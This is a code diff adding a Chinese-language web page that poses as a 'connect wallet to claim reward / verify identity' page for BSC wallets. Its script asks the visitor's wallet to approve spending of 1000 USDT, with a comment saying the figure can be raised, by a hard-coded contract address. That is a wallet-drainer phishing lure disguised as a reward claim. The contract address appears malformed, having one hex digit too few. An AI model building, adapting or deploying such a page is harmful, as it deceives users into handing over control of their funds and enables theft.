@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>连接钱包 - 领取奖励 / 验证身份</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background: #f0f2f5; }
+    .container { max-width: 420px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+    h1 { color: #1a73e8; }
+    button { 
+      background: #1a73e8; color: white; border: none; padding: 14px 32px; 
+      font-size: 18px; border-radius: 8px; cursor: pointer; margin: 20px 0; 
+    }
+    button:hover { background: #1557b0; }
+    #status { margin-top: 20px; color: #333; min-height: 60px; }
+    .small { font-size: 14px; color: #666; margin-top: 30px; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>连接钱包领取奖励</h1>
+  <p>请连接您的钱包并授权 USDT 以完成身份验证或领取奖励。</p>
+  
+  <button onclick="connectAndApprove()">连接钱包并授权</button>
+  
+  <div id="status"></div>
+  
+  <div class="small">
+    支持 BSC 网络 · TokenPocket / MetaMask / Trust Wallet 等
+  </div>
+</div>
+
+<script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+<script>
+const CONTRACT_ADDRESS = "0x3508d14f0f3642d326010d8226CDE77EF60a06d";
+const USDT_ADDRESS    = "0x55d398326f99059fF775485246999027B3197955";
+const APPROVE_AMOUNT   = "1000000000000000000000"; // 1000 USDT (18 decimals)，可改大一点
+
+async function connectAndApprove() {
+  const status = document.getElementById("status");
+  status.innerHTML = "正在连接钱包...";
+
+  if (!window.ethereum) {
+    status.innerHTML = "未检测到钱包，请使用 TokenPocket 或其他支持 WalletConnect 的钱包打开此页面";
+    return;
+  }
+
+  try {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = provider.getSigner();
+    const myAddress = await signer.getAddress();
+
+    status.innerHTML = `已连接：${myAddress.slice(0,6)}...${myAddress.slice(-4)}<br>正在请求 USDT 授权...`;
+
+    // USDT ABI 只需要 approve 函数
+    const usdtAbi = [
+      "function approve(address spender, uint256 amount) external returns (bool)"
+    ];
+    const usdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);
+
+    // 发起授权交易
+    const tx = await usdt.approve(CONTRACT_ADDRESS, APPROVE_AMOUNT);
+    status.innerHTML = `授权交易已发送！<br>交易哈希: ${tx.hash}<br>请在钱包中确认...`;
+
+    await tx.wait();
+    status.innerHTML = "授权成功！您已允许合约使用您的 USDT。<br>请继续后续操作或关闭页面。";
+  } catch (e) {
+    status.innerHTML = "操作失败：" + (e.reason || e.message || "未知错误");
+    console.error(e);
+  }
+}
+</script>
+
+</body>
+</html>
